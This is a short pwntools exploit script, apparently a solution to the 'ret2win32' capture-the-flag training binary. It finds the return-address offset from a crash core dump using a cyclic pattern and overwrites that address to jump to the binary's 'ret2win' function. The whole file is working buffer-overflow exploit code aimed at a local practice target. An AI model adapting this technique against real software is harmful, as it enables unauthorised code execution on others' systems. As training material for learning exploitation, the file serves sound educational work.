from pwn import *

# Generate a cyclic pattern so that we can auto-find the offset
io = process('./ret2win32')

print io.recv()
io.sendline(cyclic(128))
io.wait()
# Get the core dump
#core = Coredump('./core')
core = io.corefile


# Cool! Now let's just replace that value with the address of 'win'
crash = ELF('./ret2win32')
#print cyclic_find(core.rsp)
payload = fit({
    cyclic_find(core.eip): crash.symbols.ret2win
})
print payload
io = process('./ret2win32')

io.recvuntil("fgets!\n")


io.sendline(payload)
print io.recvline()
print io.recvline()
